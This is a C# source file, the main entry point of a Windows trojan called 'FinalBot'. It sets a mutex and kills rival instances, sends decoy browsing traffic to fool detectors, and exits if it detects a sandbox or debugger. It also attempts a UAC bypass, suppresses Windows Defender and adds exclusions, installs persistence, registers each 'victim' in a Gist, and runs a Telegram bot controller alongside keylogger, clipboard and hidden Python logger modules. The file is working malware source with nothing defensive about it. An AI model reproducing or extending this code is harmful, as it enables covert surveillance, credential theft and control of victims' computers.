using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using VanguardCore;
using VanguardCore.Modules;
using FinalBot.Modules;

namespace FinalBot
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);

        private static Mutex? _mutex;

        private static void DebugLog(string msg)
        {
            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
        }

        private static void Log(string msg) => DebugLog(msg);

        static async Task Main(string[] args)
        {
            Console.WriteLine($"[DEBUG] Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
            
            bool isInjected = ElevationService.IsInjected();
            int fromPid = 0;
            string fromArg = Array.Find(args, a => a.StartsWith("--from="));
            if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;

            if (!isInjected)
            {
                // 1. Single Instance Check & Aggressive Cleanup
                bool createdNew;
                string mutexName = "Global\\Vanguard_System_Runtime_7X2B9";
                _mutex = new Mutex(true, mutexName, out createdNew);

                if (!createdNew) 
                {
                    Console.WriteLine("[-] Instance already active. Attempting aggressive recycle...");
                    DebugLog("Process already running. Killing existing instances to resolve Telegram conflict.");
                    
                    try {
                        string currentName = Process.GetCurrentProcess().ProcessName;
                        int currentId = Process.GetCurrentProcess().Id;
                        foreach (var proc in Process.GetProcessesByName(currentName)) {
                            if (proc.Id != currentId) {
                                try {
                                    proc.Kill(true);
                                    Console.WriteLine($"[+] Terminated old instance: PID={proc.Id}");
                                } catch { }
                            }
                        }
                        Thread.Sleep(2000); // Give time for OS to release resources/sockets
                    } catch { }

                    // Try acquiring mutex again after cleanup
                    _mutex = new Mutex(true, mutexName, out createdNew);
                    if (!createdNew) {
                        Console.WriteLine("[-] Critical: Failed to acquire mutex after cleanup. Exit.");
                        return;
                    }
                    Console.WriteLine("[+] Mutex acquired after cleanup.");
                }
                DebugLog("Mutex acquired. Initializing services...");
            }
            else
            {
                DebugLog($"Running as V3 INJECTED child from PID {fromPid}.");
                if (fromPid > 0) WatchdogManager.Start(fromPid);
            }

            // 0. Extract Embedded Resources
            try { ResourceModule.ExtractAll(); }
            catch (Exception ex) { 
                Console.WriteLine($"[!] FATAL: Resource extraction failed: {ex.Message}"); 
                Console.WriteLine("Press any key to exit..."); Console.ReadKey();
                return; 
            }

            // 3. Decoy Traffic — looks like normal browsing to AI detectors
            _ = Task.Run(async () =>
            {
                using var http = new HttpClient();
                http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                string[] decoyUrls = {
                    "https://www.google.com/search?q=weather+today",
                    "https://www.bing.com/search?q=latest+news",
                    "https://api.github.com/",
                    "https://www.cloudflare.com/",
                    "https://dns.google/"
                };
                var rng = new Random();
                while (true)
                {
                    try { await http.GetStringAsync(decoyUrls[rng.Next(decoyUrls.Length)]); } catch { }
                    await Task.Delay(rng.Next(45_000, 120_000));
                }
            });

            // 2. Anti-Analysis Check
            if (SafetyManager.VerifySystemContext()) 
            {
                DebugLog("Sandbox/Debugger detected. Exiting.");
                Console.WriteLine("[!] STEALTH MODE: Security context violation (Sandbox/Debugger).");
                Console.WriteLine("Press any key to exit..."); Console.ReadKey();
                return;
            }

            // 3. Generate behavioral noise
            SafetyManager.AntiBehavior();

            // 3. UAC Check & Bypass (Skip if already injected/elevated)
            if (!isInjected && !ElevationService.IsAdmin())
            {
                // Native path retrieval for stability
                var sb = new StringBuilder(1024);
                Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
                string selfPath = sb.ToString();
                
                if (string.IsNullOrEmpty(selfPath)) selfPath = "WinCoreAudit.exe";
                
                DebugLog("[UAC] Releasing mutex to allow elevated child...");
                _mutex?.Dispose();
                _mutex = null;
                Thread.Sleep(500);

                // Try V3 Hardcore Injection first
                if (ElevationService.RequestElevation(selfPath))
                {
                    DebugLog("UAC bypass successful (V3 or Chain). Exiting parent.");
                    Process.GetCurrentProcess().Kill();
                }
                
                DebugLog("[UAC] All bypass methods failed. Continuing as User.");
                _mutex = new Mutex(true, "Global\\Vanguard_System_Runtime_7X2B9", out _);
            }
            else if (ElevationService.IsAdmin())
            {
                DebugLog("Running as ADMIN. Applying Defender suppressions...");
                
                // Red Team Hardcore: Disable Defender Notifications and set exclusions
                SafetyManager.DisableDefenderNotifications();
                SafetyManager.BypassDefenderPlatform(); // Set exclusions

                if (Array.Exists(args, a => a == "--uac-child") || isInjected)
                {
                    DebugLog("Child process (admin) signaled success.");
                    try { 
                        string evArg = Array.Find(args, a => a.StartsWith("--event="));
                        string evName = evArg != null ? evArg.Split('=')[1] : "Global\\Vanguard_Elevation_Success";
                        
                        using var successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, evName);
                        successEvent.Set();
                    } catch (Exception ex) { DebugLog($"Event signal failed: {ex.Message}"); }
                }
            }

            // 4. Persistence
            Persistence.Install();

            // 5. Start Orchestrator
            try 
            {
                DebugLog("Loading ConfigManager...");
                ConfigManager.Load();
                
                // A-03: Register victim in Gist for P2P Mesh & Session Switching
                _ = Task.Run(async () => {
                    try { await GistManager.UpdateFile($"victim_{ConfigManager.VictimName}.json", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")); } catch { }
                });
                string token = ConfigManager.Get("BOT_TOKEN");
                string adminId = ConfigManager.Get("ADMIN_ID");
                
                DebugLog($"Token length: {token?.Length ?? 0}, AdminID: {adminId}");

                if (string.IsNullOrEmpty(token) || token.Length < 10)
                {
                    DebugLog("Token invalid. Application cannot proceed.");
                    return;
                }

                DebugLog("Connectivity check (China Bypass)...");
                var httpClient = await ProxyTunnel.GetBestHttpClient();

                DebugLog("Creating BotOrchestrator...");
                Log("Creating BotOrchestrator...");
                var orchestrator = new BotOrchestrator(token, adminId, httpClient);
                
                // Start Background Modules
                DebugLog("Starting Modules...");
                try { 
                    KeyloggerModule.Start(); 
                    DebugLog("Keylogger started.");
                } catch (Exception ex) { 
                    DebugLog($"Keylogger failed: {ex.Message}"); 
                    Log($"Keylogger failed: {ex.Message}");
                }

                try { 
                    ClipboardModule.Start(); 
                    DebugLog("Clipboard started.");
                } catch (Exception ex) { 
                    DebugLog($"Clipboard failed: {ex.Message}"); 
                    Log($"Clipboard failed: {ex.Message}");
                }

                // Start Global Logger (Python script)
                _ = Task.Run(() => {
                    try {
                        string loggerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
                        if (File.Exists(loggerPath)) {
                            Process.Start(new ProcessStartInfo {
                                FileName = "python",
                                Arguments = $"\"{loggerPath}\"",
                                UseShellExecute = false,
                                CreateNoWindow = true
                            });
                            DebugLog("GlobalLogger.py started.");
                            Log("GlobalLogger.py started.");
                        } else {
                            DebugLog($"GlobalLogger.py not found at {loggerPath}");
                            Log($"GlobalLogger.py not found at {loggerPath}");
                        }
                    } catch (Exception ex) {
                        DebugLog($"Error starting GlobalLogger.py: {ex.Message}");
                        Log($"Error starting GlobalLogger.py: {ex.Message}");
                    }
                });

                DebugLog("Starting BotOrchestrator...");
                Log("Starting BotOrchestrator...");
                await orchestrator.StartAsync();
                Log("BotOrchestrator started successfully.");
            }
            catch (Exception ex)
            {
                DebugLog($"FATAL ERROR: {ex.Message}\n{ex.StackTrace}");
                Log("FATAL CRASH: " + ex.ToString());
                Console.WriteLine($"[FATAL] {ex.Message}");
            }
            Console.WriteLine("\n[DEBUG] Execution finished. Press any key to exit...");
            Console.ReadKey();
        }

        private static void LogCrash(Exception ex)
        {
            try
            {
                // Write to hidden temp path — avoid obvious Public folder
                string path = Path.Combine(Path.GetTempPath(), $".{Environment.MachineName}_sys.log");
                File.AppendAllText(path, $"[CRITICAL] {DateTime.Now}: {ex}\n");
                File.SetAttributes(path, FileAttributes.Hidden);
            } catch { }
        }
    }
}
